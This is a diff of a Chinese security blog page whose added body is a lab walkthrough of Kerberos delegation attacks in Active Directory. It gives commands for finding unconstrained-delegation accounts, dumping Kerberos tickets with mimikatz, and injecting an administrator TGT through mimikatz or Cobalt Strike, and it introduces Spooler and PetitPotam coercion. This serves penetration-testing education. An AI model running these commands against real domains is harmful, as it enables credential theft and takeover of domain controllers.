@@ -6,17 +6,49 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta property="og:type" content="article">
+    <meta name="description" content="域渗透之委派攻击详解（非约束委派&#x2F;约束委派&#x2F;资源约束委派）委派(SPN)是域中的一种安全设置，可以允许某个机器上的服务代表某个用户去执行某个操作，主要分为三种：  非约束性委派 约束性委派 基于资源的约束性委派（RBCD）  非约束性委派非约束委派：当user访问service1时，如果service1的服务账号开启了unconstrained delegation（非约束委派">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Kerberos(4)-非约束&amp;约束&amp;资源约束委派攻击">
 <meta property="og:url" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/index.html">
 <meta property="og:site_name" content="Dtuncle&#39;s Blog">
+<meta property="og:description" content="域渗透之委派攻击详解（非约束委派&#x2F;约束委派&#x2F;资源约束委派）委派(SPN)是域中的一种安全设置，可以允许某个机器上的服务代表某个用户去执行某个操作，主要分为三种：  非约束性委派 约束性委派 基于资源的约束性委派（RBCD）  非约束性委派非约束委派：当user访问service1时，如果service1的服务账号开启了unconstrained delegation（非约束委派">
 <meta property="og:locale">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220322235742047.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220323012256168.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220323020157447.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220323021423567.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220323023457250.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220323030310950.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220324014635418.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220324022115369.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20211219220448509.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220328021434968.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220328021541291.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220329030000500.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220329031500956.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220329032358645.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220328022150400.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220328022219103.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220330010727356.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220330005056889.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220330010808186.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220330011059734.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220330013644460.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220330033409768.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220330040138880.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220330041536956.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220331010422685.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220331010249531.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220331010857783.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220331011335856.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220331011438447.png">
 <meta property="article:published_time" content="2022-02-24T18:10:35.239Z">
-<meta property="article:modified_time" content="2022-02-24T18:12:04.865Z">
+<meta property="article:modified_time" content="2022-04-17T07:29:29.083Z">
 <meta property="article:author" content="dtuncle">
 <meta property="article:tag" content="Kerberos">
 <meta property="article:tag" content="委派">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://dtuncle.github.io/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220322235742047.png">
     
     
       
@@ -79,14 +111,14 @@
         <li><a class="icon" aria-label="Post Anterior" href="/2022/02/25/Kerberos(5)-Kerberos%E4%B8%AD%E7%BB%A7%E5%88%9D%E8%AF%95/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
-        <li><a class="icon" aria-label="Post Següent" href="/2022/02/25/Kerberos(3)-%E5%A7%94%E6%B4%BE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Post Siguiente" href="/2022/02/25/Kerberos(3)-%E5%A7%94%E6%B4%BE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
-        <li><a class="icon" aria-label="Adalt" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Arriba" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" aria-label="Compartir Post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
-      <span id="i-next" class="info" style="display:none;">Post Següent</span>
-      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-next" class="info" style="display:none;">Post Siguiente</span>
+      <span id="i-top" class="info" style="display:none;">Arriba</span>
       <span id="i-share" class="info" style="display:none;">Compartir Post</span>
     </span>
     <br/>
@@ -107,7 +139,7 @@
 
     </div>
     <div id="toc">
-      
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3%EF%BC%88%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-x2F-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-x2F-%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">域渗透之委派攻击详解（非约束委派&#x2F;约束委派&#x2F;资源约束委派）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="toc-number">2.</span> <span class="toc-text">非约束性委派</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8"><span class="toc-number">2.1.</span> <span class="toc-text">非约束委派利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%AE%9E%E8%B7%B5"><span class="toc-number">2.2.</span> <span class="toc-text">非约束委派实践</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E4%B8%BB%E6%9C%BA%E7%94%A8%E6%88%B7%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.1.</span> <span class="toc-text">非约束委派主机用户利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%9C%8D%E5%8A%A1%E7%94%A8%E6%88%B7%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.2.</span> <span class="toc-text">非约束委派服务用户利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-Spooler%E6%89%93%E5%8D%B0%E6%9C%BA%E6%9C%8D%E5%8A%A1-x2F-efsrpc-PetitPotam"><span class="toc-number">2.3.</span> <span class="toc-text">非约束委派+Spooler打印机服务&#x2F;efsrpc-PetitPotam</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C"><span class="toc-number">2.3.1.</span> <span class="toc-text">操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%87%86%E5%A4%87%EF%BC%9A"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">工具准备：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PetitPotam%EF%BC%9A"><span class="toc-number">2.3.1.2.</span> <span class="toc-text">PetitPotam：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SpoolSample%EF%BC%9A"><span class="toc-number">2.3.1.3.</span> <span class="toc-text">SpoolSample：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">3.</span> <span class="toc-text">约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8"><span class="toc-number">3.1.</span> <span class="toc-text">约束委派利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%AE%9E%E8%B7%B5"><span class="toc-number">3.2.</span> <span class="toc-text">约束委派实践</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">4.</span> <span class="toc-text">基于资源约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8"><span class="toc-number">4.1.</span> <span class="toc-text">基于资源约束委派利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%AE%9E%E8%B7%B5"><span class="toc-number">4.2.</span> <span class="toc-text">基于资源约束委派实践</span></a></li></ol></li></ol>
     </div>
   </span>
 </div>
@@ -156,7 +188,179 @@
   
 
   <div class="content" itemprop="articleBody">
-    
+    <h1 id="域渗透之委派攻击详解（非约束委派-x2F-约束委派-x2F-资源约束委派）"><a href="#域渗透之委派攻击详解（非约束委派-x2F-约束委派-x2F-资源约束委派）" class="headerlink" title="域渗透之委派攻击详解（非约束委派&#x2F;约束委派&#x2F;资源约束委派）"></a>域渗透之委派攻击详解（非约束委派&#x2F;约束委派&#x2F;资源约束委派）</h1><p>委派(SPN)是域中的一种安全设置，可以允许某个机器上的服务代表某个用户去执行某个操作，主要分为三种：</p>
+<ol>
+<li>非约束性委派</li>
+<li>约束性委派</li>
+<li>基于资源的约束性委派（RBCD）</li>
+</ol>
+<h1 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h1><p>非约束委派：当user访问service1时，如果service1的服务账号开启了<code>unconstrained delegation</code>（非约束委派），则当<code>user</code>访问<code>service1</code>时会将user的<code>TGT</code>发送给<code>service1</code>并保存在内存中以备下次重用，然后<code>service1</code> 就可以利用这张<code>TGT</code>以user的身份去访问域内的任何服务（任何服务是指user能访问的服务）了</p>
+<h2 id="非约束委派利用"><a href="#非约束委派利用" class="headerlink" title="非约束委派利用"></a>非约束委派利用</h2><p>由于非约束委派得不安全性，现在各种真实环境中基本很难遇到。但是由于域控制器默认是非约束委派，因此非约束委派可以用于跨域攻击。由于需要目标进行回连，除了钓鱼让目标链接目前常用的方法是利用<strong>Spooler打印机服务漏洞和efsrpc-PetitPotam漏洞</strong>。</p>
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220322235742047.png" alt="image-20220322235742047"></p>
+<h2 id="非约束委派实践"><a href="#非约束委派实践" class="headerlink" title="非约束委派实践"></a>非约束委派实践</h2><h3 id="非约束委派主机用户利用"><a href="#非约束委派主机用户利用" class="headerlink" title="非约束委派主机用户利用"></a>非约束委派主机用户利用</h3><p><strong>实验设置：</strong></p>
+<p>在域控制器中设置用户和计算机用户，选择实验计算机右键属性在委派配置中选择信任此计算机来委派任何服务(Kerberos)，确认。</p>
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220323012256168.png" alt="image-20220323012256168"></p>
+<p><strong>实验操作：</strong></p>
+<ol>
+<li>查找非约束委派计算机用户</li>
+</ol>
+<p>首先需要获取到被设置了非约束委派的计算机用户权限。这里是WEB006。</p>
+<p>如果在域中寻找攻击路径中的非约束委派计算机用户可以使用一下工具</p>
+<p><strong>AdFind.exe</strong>，工具地址：<a target="_blank" rel="noopener" href="https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml">https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe <span class="literal">-b</span> <span class="string">&quot;DC=dt,DC=com&quot;</span> <span class="operator">-f</span> <span class="string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+<p><strong>PowerView</strong>，工具地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/raw/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/raw/dev/Recon/PowerView.ps1</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-Command</span> <span class="string">&quot;Import-Module .\powerview.ps1;Get-NetUser -Domain test.com|select name&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>ldapsearch</strong>，kali自带</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://10.10.10.10:389 -D <span class="string">&quot;test@dt.com&quot;</span> -b <span class="string">&quot;DC=test,DC=com&quot;</span> -w testpassword <span class="string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span>|grep -iE <span class="string">&quot;distinguishedName&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>工具原理都是在ldap中搜索符和条件的服务用户和计算机用户</p>
+<p>这里使用AdFind.exe查询，在非域用户情况下执行会提示无效凭据，这是因为ldap需要域用户才能访问。</p>
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220323020157447.png" alt="image-20220323020157447"></p>
+<p>重新使用域用户查询。</p>
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220323021423567.png" alt="image-20220323021423567"></p>
+<p>这里直接上线的WEB006机器，所以直接在此机器上进行操作，上面AD和AD2都是域控制器。</p>
+<p>如果是真实环境，有正常服务，会在内存中dump出很多其他用户的凭证。但是为了模拟有正常服务有用户访问。这里WEB006中起了winRM服务，所以模拟其他用户（这里使用域管理员用户）来访问。</p>
+<ol start="2">
+<li>其他用户访问非约束委派服务</li>
+</ol>
+<p>powershell链接winRM服务</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> WEB006</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220323023457250.png" alt="image-20220323023457250"></p>
+<ol start="3">
+<li>非约束委派服务计算机导出凭证</li>
+</ol>
+<p>使用mimikatz导出凭证(mimikatz导出凭证需要管理员权限)</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::tickets /export&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行后会在当前目录生成当前计算机保存的所有票据。</p>
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220323030310950.png" alt="image-20220323030310950"></p>
+<ol start="4">
+<li>注入TGT到当前会话中，如果使用mimikatz导入不太好利用，CS直接提供了相关命令kerberos_ticket_use。</li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell mimikatz.exe <span class="string">&quot;kerberos::ptt [0;854239]-2-0-60a10000-Administrator@krbtgt-DT.COM.kirbi&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<p>CS中</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_use [<span class="number">0</span>;<span class="type">abf109</span>]<span class="literal">-2-0-60a10000-Administrator</span>@krbtgt<span class="literal">-DT</span>.COM.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220324014635418.png" alt="image-20220324014635418"></p>
+<p>路径是默认从cs目录，所以需要把导出的凭证下载到本地。</p>
+<p>然后就可以直接连接到AD。</p>
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220324022115369.png" alt="image-20220324022115369"></p>
+<h3 id="非约束委派服务用户利用"><a href="#非约束委派服务用户利用" class="headerlink" title="非约束委派服务用户利用"></a>非约束委派服务用户利用</h3><p>查找域中配置非约束委派的服务用户：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe <span class="literal">-b</span> <span class="string">&quot;DC=dt,DC=com&quot;</span> <span class="operator">-f</span> <span class="string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20211219220448509.png" alt="image-20211219220448509"></p>
+<p>然后跟非约束机器用户利用类似，只是连接的是非约束服务用户所起的对应服务。</p>
+<h2 id="非约束委派-Spooler打印机服务-x2F-efsrpc-PetitPotam"><a href="#非约束委派-Spooler打印机服务-x2F-efsrpc-PetitPotam" class="headerlink" title="非约束委派+Spooler打印机服务&#x2F;efsrpc-PetitPotam"></a>非约束委派+Spooler打印机服务&#x2F;efsrpc-PetitPotam</h2><p>单纯的非约束委派话需要管理员主动连接，在实战环境利用比较鸡肋。</p>
+<p>利用Spooler打印机服务&#x2F;efsrpc-PetitPotam可以强制指定的主机进行连接。</p>
+<p>Spooler打印机服务漏洞原理：利用Windows打印系统远程协议<code>（MS-RPRN）</code>中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification（Ex）</code>方法强制任何运行了<code>Spooler</code>服务的计算机以通过<code>Kerberos</code>或<code>NTLM</code>对攻击者选择的目标进行身份验证。</p>
